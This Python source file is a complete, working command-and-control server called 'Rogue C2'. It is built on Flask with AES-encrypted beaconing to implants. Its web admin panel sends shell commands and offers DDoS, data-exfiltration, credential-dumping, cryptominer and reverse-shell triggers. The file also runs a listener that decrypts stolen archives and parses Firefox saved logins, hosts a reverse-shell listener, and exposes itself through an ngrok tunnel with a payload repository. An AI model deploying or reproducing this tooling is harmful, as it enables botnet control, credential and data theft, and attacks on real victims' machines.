#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
import threading, base64, os, socket, time
import zipfile, json
from Cryptodome.Cipher import AES
from datetime import datetime
import subprocess
import requests
from collections import defaultdict
import hashlib

app = Flask(__name__)
app.secret_key = 'RogueC2_RedTeam_v2'

# === Configuration ===
SECRET_KEY = b'666BabyROGUE!222'
EXFIL_DECRYPT_KEY = b'magicRogueKey!333'
C2_PORT = 4444
EXFIL_PORT = 9090
PAYLOAD_PORT = 8000

# Storage - using defaultdict for better handling
connected_bots = set()
pending_commands = defaultdict(list)
command_results = defaultdict(list)
bot_info = {}
# Map IP to permanent bot ID
ip_to_bot_id = {}

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def get_bot_id(client_ip, implant_id=None):
    """Get or create consistent bot ID for an implant"""
    if client_ip in ip_to_bot_id:
        return ip_to_bot_id[client_ip]
    
    # Create new bot ID
    if implant_id:
        # Use implant's identifier if provided
        identifier = f"{client_ip}_{implant_id}"
    else:
        # Fallback: use IP with hash
        identifier = client_ip
    
    # Create consistent hash-based ID
    bot_hash = hashlib.md5(identifier.encode()).hexdigest()[:8]
    bot_id = f"bot_{client_ip.replace('.', '_')}_{bot_hash}"
    ip_to_bot_id[client_ip] = bot_id
    return bot_id

# ==================== FLASK ROUTES ====================

@app.route('/', methods=['GET', 'POST'])
def c2_controller():
    """Main C2 endpoint - handles encrypted communications"""
    if request.method == 'GET':
        return "Rogue C2 Server Active - Use POST for encrypted commands"
    
    # Handle POST from implants
    try:
        client_ip = request.remote_addr
        encrypted_data = request.get_data()
        
        if not encrypted_data:
            return "No data", 400
        
        # Decrypt the command
        decrypted_cmd = decrypt_command(encrypted_data)
        
        # Handle beacon/command
        if decrypted_cmd == "beacon":
            # Use consistent bot ID
            beacon_id = get_bot_id(client_ip)
            
            # Add to connected bots
            connected_bots.add(beacon_id)
            
            # Update bot info
            if beacon_id not in bot_info:
                bot_info[beacon_id] = {
                    'ip': client_ip,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0,
                    'commands_sent': 0,
                    'results_received': 0
                }
            
            # Update stats
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            bot_info[beacon_id]['beacon_count'] += 1
            
            # Return pending commands or "pong"
            commands = pending_commands.get(beacon_id, [])
            
            if commands:
                command_to_execute = commands.pop(0)
                response = command_to_execute
                print(f"[→] Sending command to {beacon_id} ({client_ip}): {command_to_execute}")
                bot_info[beacon_id]['commands_sent'] += 1
            else:
                response = "pong"
                print(f"[✓] Beacon #{bot_info[beacon_id]['beacon_count']} from {beacon_id} ({client_ip})")
            
            return encrypt_response(response)
        
        elif decrypted_cmd.startswith("result:"):
            # Store result from implant
            result = decrypted_cmd.replace("result:", "", 1)
            
            # Find bot ID for this IP
            beacon_id = get_bot_id(client_ip)
            
            if beacon_id:
                result_entry = {
                    'result': result,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'client_ip': client_ip,
                    'bot_id': beacon_id
                }
                
                command_results[beacon_id].append(result_entry)
                bot_info[beacon_id]['results_received'] += 1
                
                # Keep only last 10 results
                if len(command_results[beacon_id]) > 10:
                    command_results[beacon_id] = command_results[beacon_id][-10:]
                
                print(f"[✓] Result from {beacon_id} ({client_ip}): {result[:100]}...")
            else:
                print(f"[!] Result from unknown bot: {client_ip}")
            
            return encrypt_response("result_received")
        
        elif decrypted_cmd.startswith("identify:"):
            # Implant sending identification
            implant_id = decrypted_cmd.replace("identify:", "", 1)
            beacon_id = get_bot_id(client_ip, implant_id)
            return encrypt_response(f"identified:{beacon_id}")
        
        else:
            # Unknown command
            return encrypt_response(f"Unknown command: {decrypted_cmd}")
            
    except Exception as e:
        print(f"[!] C2 controller error: {e}")
        return encrypt_response(f"[!] Error: {str(e)}")

@app.route('/admin', methods=['GET'])
def admin_panel():
    """Web-based admin panel"""
    admin_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>R0gue C2 Admin Panel</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { background: #111; padding: 20px; border-bottom: 2px solid #00ff00; }
            .section { background: #151515; padding: 20px; margin: 20px 0; border: 1px solid #333; }
            .bot { background: #1a1a1a; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0000; }
            .command-form { margin: 15px 0; }
            input, textarea, select, button { 
                background: #222; color: #0f0; border: 1px solid #444; 
                padding: 8px; margin: 5px; font-family: 'Courier New', monospace;
            }
            button { cursor: pointer; background: #333; }
            button:hover { background: #444; }
            .results { background: #111; padding: 10px; margin: 10px 0; font-size: 12px; }
            .status { color: #00ff00; }
            .error { color: #ff0000; }
            .active-bot { border-left: 4px solid #00ff00 !important; }
            .bot-stats { font-size: 12px; color: #888; margin-top: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1> R0gue C2  | by ek0ms savi0r </h1>
                <p>Server Time: {{ time }} | Active Bots: {{ bot_count }} | Commands Pending: {{ pending_count }}</p>
            </div>
            
            <div class="section">
                <h2> Active Bots ({{ bot_count }})</h2>
                {% for bot in bot_list %}
                <div class="bot {{ 'active-bot' if bot.last_seen_diff < 60 else '' }}">
                    <strong> {{ bot.id }}</strong>
                    <span class="status">● Last seen: {{ bot.last_seen }} ({{ bot.last_seen_diff }}s ago)</span>
                    <span class="status">● IP: {{ bot.ip }}</span>
                    <div class="bot-stats">
                         Beacons: {{ bot.beacon_count }} |  Cmds Sent: {{ bot.commands_sent }} |  Results: {{ bot.results_received }}
                    </div>
                    
                    <div class="command-form">
                        <input type="text" id="cmd_{{ bot.id }}" placeholder="Command (whoami, ls, etc.)" style="width: 300px;">
                        <select id="type_{{ bot.id }}">
                            <option value="shell">Shell Command</option>
                            <option value="trigger_ddos">DDoS Attack</option>
                            <option value="trigger_exfil">Exfiltrate Data</option>
                            <option value="trigger_dumpcreds">Dump Credentials</option>
                            <option value="trigger_mine">Start Miner</option>
                            <option value="reverse_shell">Reverse Shell</option>
                        </select>
                        <button onclick="sendCommand('{{ bot.id }}')">Send Command</button>
                        <button onclick="clearPending('{{ bot.id }}')" style="background: #660000;">Clear Pending</button>
                    </div>
                    
                    {% if pending_commands.get(bot.id) %}
                    <div class="results" style="border-left: 3px solid orange;">
                        <h4> Pending Commands:</h4>
                        {% for cmd in pending_commands[bot.id] %}
                        <div><small>→</small> {{ cmd }}</div>
                        {% endfor %}
                    </div>
                    {% endif %}
                    
                    {% if results.get(bot.id) %}
                    <div class="results">
                        <h4> Recent Results:</h4>
                        {% for result in results[bot.id][-3:] %}
                        <div><small>{{ result.timestamp }}:</small> {{ result.result[:150] }}...</div>
                        {% endfor %}
                    </div>
                    {% endif %}
                </div>
                {% endfor %}
            </div>
            
            <div class="section">
                <h2> Quick Commands</h2>
                <button onclick="sendToAll('whoami')">Whoami (All)</button>
                <button onclick="sendToAll('uname -a')">System Info</button>
                <button onclick="sendToAll('ip a')">Network Info</button>
                <button onclick="sendToAll('trigger_dumpcreds')">Dump Creds</button>
                <button onclick="sendToAll('ls -la /home')">List Homes</button>
            </div>
            
            <div class="section">
                <h2> Manual Command</h2>
                <input type="text" id="manual_bot" placeholder="Bot ID">
                <input type="text" id="manual_cmd" placeholder="Command" style="width: 400px;">
                <button onclick="sendManualCommand()">Send</button>
            </div>
            
            <div class="section">
                <h2> Server Status</h2>
                <p>Ngrok URL: {{ ngrok_url }}</p>
                <p>C2 Port: {{ c2_port }}</p>
                <p>Exfil Port: {{ exfil_port }}</p>
                <p>Reverse Shell Port: 9001</p>
                <p>Payloads: <a href="{{ payload_url }}" target="_blank">{{ payload_url }}</a></p>
            </div>
        </div>
        
        <script>
            function sendCommand(botId) {
                const cmdInput = document.getElementById('cmd_' + botId);
                const typeSelect = document.getElementById('type_' + botId);
                const command = typeSelect.value === 'shell' ? cmdInput.value : typeSelect.value + (cmdInput.value ? ' ' + cmdInput.value : '');
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent to ' + botId + ' (ID: ' + data.command_id + ')');
                    cmdInput.value = '';
                });
            }
            
            function clearPending(botId) {
                fetch('/clear_pending/' + botId, {
                    method: 'POST'
                }).then(r => r.json()).then(data => {
                    alert('Cleared pending commands for ' + botId);
                    location.reload();
                });
            }
            
            function sendToAll(command) {
                {% for bot in bot_list %}
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: '{{ bot.id }}',
                        command: command
                    })
                });
                {% endfor %}
                alert('Command sent to all bots: ' + command);
            }
            
            function sendManualCommand() {
                const botId = document.getElementById('manual_bot').value;
                const command = document.getElementById('manual_cmd').value;
                
                if (!botId || !command) {
                    alert('Please enter both Bot ID and Command');
                    return;
                }
                
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: botId,
                        command: command
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent: ' + data.command_id);
                });
            }
            
            // Auto-refresh every 15 seconds
            setTimeout(() => location.reload(), 15000);
        </script>
    </body>
    </html>
    '''
    
    # Prepare bot list with time since last seen
    current_time = datetime.now()
    bot_list = []
    
    # Clean up old bots (not seen for 5 minutes)
    bots_to_remove = []
    for bot_id in list(connected_bots):
        if bot_id in bot_info:
            last_seen_str = bot_info[bot_id].get('last_seen')
            if last_seen_str:
                last_seen_time = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S')
                seconds_ago = int((current_time - last_seen_time).total_seconds())
                
                if seconds_ago > 300:  # 5 minutes
                    bots_to_remove.append(bot_id)
                else:
                    bot_list.append({
                        'id': bot_id,
                        'ip': bot_info[bot_id].get('ip', 'Unknown'),
                        'last_seen': last_seen_str,
                        'last_seen_diff': seconds_ago,
                        'beacon_count': bot_info[bot_id].get('beacon_count', 0),
                        'commands_sent': bot_info[bot_id].get('commands_sent', 0),
                        'results_received': bot_info[bot_id].get('results_received', 0)
                    })
    
    # Remove old bots
    for bot_id in bots_to_remove:
        connected_bots.discard(bot_id)
        if bot_id in bot_info:
            del bot_info[bot_id]
    
    # Sort by most recent
    bot_list.sort(key=lambda x: x['last_seen_diff'])
    
    pending_count = sum(len(cmds) for cmds in pending_commands.values())
    
    # Get ngrok URL if available
    ngrok_url = "Not available"
    try:
        r = requests.get("http://localhost:4040/api/tunnels", timeout=2)
        data = r.json()
        for tunnel in data["tunnels"]:
            if tunnel["proto"] == "https":
                ngrok_url = tunnel["public_url"]
                break
    except:
        pass
    
    # Build payload URL
    payload_url = f"{ngrok_url}/payloads/" if ngrok_url != "Not available" else f"http://localhost:{C2_PORT}/payloads/"
    
    return render_template_string(admin_html,
        time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        bot_list=bot_list,
        bot_count=len(bot_list),
        results=command_results,
        pending_commands=pending_commands,
        pending_count=pending_count,
        ngrok_url=ngrok_url,
        payload_url=payload_url,
        c2_port=C2_PORT,
        exfil_port=EXFIL_PORT
    )

@app.route('/command', methods=['POST'])
def add_command():
    """Add command for a bot"""
    try:
        data = request.json
        beacon_id = data.get('beacon_id')
        command = data.get('command')
        
        if not beacon_id or not command:
            return jsonify({'error': 'Missing beacon_id or command'}), 400
        
        pending_commands[beacon_id].append(command)
        
        print(f"[+] Command queued for {beacon_id}: {command}")
        
        return jsonify({
            'status': 'queued',
            'command_id': f"cmd_{int(time.time())}_{len(pending_commands[beacon_id])}",
            'beacon_id': beacon_id
        })
        
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/clear_pending/<bot_id>', methods=['POST'])
def clear_pending(bot_id):
    """Clear pending commands for a bot"""
    if bot_id in pending_commands:
        pending_commands[bot_id] = []
        print(f"[+] Cleared pending commands for {bot_id}")
        return jsonify({'status': 'cleared', 'bot_id': bot_id})
    return jsonify({'error': 'Bot not found'}), 404

@app.route('/beacons')
def list_beacons():
    """List all active beacons"""
    return jsonify({
        'beacons': list(connected_bots),
        'total': len(connected_bots),
        'server_time': datetime.now().isoformat()
    })

@app.route('/payloads/<path:filename>')
def serve_payload(filename):
    """Serve payload files directly from the payloads directory"""
    payload_dir = os.path.join(os.getcwd(), "payloads")
    file_path = os.path.join(payload_dir, filename)
    
    if os.path.exists(file_path) and os.path.isfile(file_path):
        # Check file extension for proper content type
        if filename.endswith('.py'):
            content_type = 'text/plain'
        else:
            content_type = 'application/octet-stream'
        
        with open(file_path, 'rb') as f:
            response = f.read()
        
        return response, 200, {'Content-Type': content_type}
    return "Payload not found", 404

@app.route('/payloads/')
def list_payloads():
    """List available payloads"""
    payload_dir = os.path.join(os.getcwd(), "payloads")
    files = []
    if os.path.exists(payload_dir):
        files = os.listdir(payload_dir)
    
    html = f"""
    <html><body>
    <h1>Rogue C2 Payload Repository</h1>
    <ul>
    {''.join(f'<li><a href="/payloads/{f}">{f}</a></li>' for f in files if f.endswith('.py'))}
    </ul>
    </body></html>
    """
    return html

@app.route('/ngrok_status')
def ngrok_status():
    """Check ngrok status"""
    try:
        r = requests.get("http://localhost:4040/api/tunnels")
        data = r.json()
        for tunnel in data["tunnels"]:
            if tunnel["proto"] == "https":
                return jsonify({
                    'status': 'active',
                    'url': tunnel["public_url"],
                    'proto': tunnel["proto"]
                })
        return jsonify({'status': 'no_tunnels'})
    except:
        return jsonify({'status': 'error', 'message': 'Ngrok not running'})

# ==================== EXFIL LISTENER ====================

def exfil_listener():
    """Exfiltration listener for encrypted data"""
    exfil_server = socket.socket()
    exfil_server.bind(('0.0.0.0', EXFIL_PORT))
    exfil_server.listen(5)
    print(f"[EXFIL] Listening on port {EXFIL_PORT} for incoming encrypted data...")

    while True:
        conn, addr = exfil_server.accept()
        print(f"[EXFIL] Receiving from {addr[0]}...")
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()

        raw_file = f"exfil_raw_{addr[0].replace('.', '_')}.bin"
        with open(raw_file, "wb") as f:
            f.write(data)
        print(f"[EXFIL] Raw dump saved: {raw_file}")

        try:
            nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
            cipher = AES.new(EXFIL_DECRYPT_KEY, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_file = f"exfil_dec_{addr[0].replace('.', '_')}_{ts}.zip"
            with open(out_file, "wb") as f:
                f.write(plaintext)
            print(f"[EXFIL] Decrypted archive saved: {out_file}")

            extracted_dir = out_file + "_unzipped"
            with zipfile.ZipFile(out_file, 'r') as zip_ref:
                zip_ref.extractall(extracted_dir)

            for root, _, files in os.walk(extracted_dir):
                for file in files:
                    if file == "logins.json":
                        path = os.path.join(root, file)
                        print(f"\n Parsing Firefox logins.json: {path}")
                        with open(path, "r", encoding="utf-8") as f:
                            data = json.load(f)
                            for entry in data.get("logins", []):
                                print(f" - Site: {entry.get('hostname')}")
                                print(f"   Username (enc): {entry.get('encryptedUsername')}")
                                print(f"   Password (enc): {entry.get('encryptedPassword')}")
        except Exception as e:
            print(f"[!] Decryption failed: {e}")

# ==================== REVERSE SHELL LISTENER ====================

def reverse_shell_listener():
    """Reverse shell listener"""
    server = socket.socket()
    server.bind(('0.0.0.0', 9001))
    server.listen(5)
    print("[REVERSE SHELL] Listening on port 9001...")
    while True:
        conn, addr = server.accept()
        print(f"[REVERSE SHELL] Connection from {addr}")
        threading.Thread(target=handle_reverse_shell, args=(conn, addr)).start()

def handle_reverse_shell(conn, addr):
    """Handle reverse shell session"""
    try:
        conn.send(b"Rogue C2 Reverse Shell - Connected\n")
        while True:
            conn.send(b"$ ")
            cmd = conn.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            conn.send(output.encode() + b"\n")
    except:
        pass
    finally:
        conn.close()
        print(f"[REVERSE SHELL] Disconnected from {addr}")

# ==================== STARTUP ====================

def start_ngrok(port=C2_PORT):
    """Start ngrok tunnel"""
    # Kill any existing ngrok processes
    subprocess.run(["pkill", "-f", "ngrok"], stderr=subprocess.DEVNULL)
    time.sleep(2)
    
    # Start new ngrok tunnel
    subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.DEVNULL)
    time.sleep(5)
    
    try:
        r = requests.get("http://localhost:4040/api/tunnels")
        data = r.json()
        for tunnel in data["tunnels"]:
            if tunnel["proto"] == "https":
                return tunnel["public_url"]
    except Exception as e:
        print(f"[!] Ngrok failed: {e}")
    return None

def start_payload_server():
    """Start HTTP server for payloads (optional - kept for backward compatibility)"""
    payload_path = os.path.join(os.getcwd(), "payloads")
    if not os.path.exists(payload_path):
        os.makedirs(payload_path, exist_ok=True)
        print(f"[!] Created payloads directory: {payload_path}")
        print(f"[✓] Payloads will be served via Flask at /payloads/")

    # Payloads are served directly by Flask at /payloads/

def main():
    """Main startup function"""
    print("\n" + "="*60)
    print(" ROGUE C2 SERVER - Complete Command & Control")
    print("="*60)
    
    # Start listeners in threads
    threading.Thread(target=exfil_listener, daemon=True).start()
    print(f"[✓] Exfil listener started on port {EXFIL_PORT}")
    
    threading.Thread(target=reverse_shell_listener, daemon=True).start()
    print(f"[✓] Reverse shell listener started on port 9001")
    
    # Initialize payloads directory
    start_payload_server()
    
    # Start ngrok
    print("[*] Starting ngrok tunnel...")
    ngrok_url = start_ngrok()
    
    if ngrok_url:
        hostname = ngrok_url.replace("https://", "").replace("http://", "").rstrip("/")
        print(f"\n[✓] C2 SERVER IS LIVE!")
        print(f"[NGROK] C2 URL: {ngrok_url}")
        print(f"[NGROK] Hostname: {hostname}")
        print(f"[NGROK] Payloads: {ngrok_url}/payloads/")
        print(f"\n[→] Set in implant:")
        print(f"    C2_HOST = '{hostname}'")
        print(f"    C2_PORT = 443")
        print(f"    PAYLOAD_REPO = '{ngrok_url}/payloads/'")
    else:
        print("[!] Ngrok tunnel failed. Using localhost.")
        print(f"[→] Local C2: http://localhost:{C2_PORT}")
        print(f"[→] Local Payloads: http://localhost:{C2_PORT}/payloads/")
    
    print(f"\n[ADMIN] Web Panel: http://localhost:{C2_PORT}/admin")
    print(f"[EXFIL] Listener: 0.0.0.0:{EXFIL_PORT}")
    print(f"[SHELL] Reverse Shell: 0.0.0.0:9001")
    print(f"[PAYLOADS] Available at: {ngrok_url}/payloads/" if ngrok_url else f"[PAYLOADS] Available at: http://localhost:{C2_PORT}/payloads/")
    print("\n" + "="*60)
    
    # Start Flask server
    app.run(host='0.0.0.0', port=C2_PORT, debug=False, threaded=True)

if __name__ == "__main__":
    main()
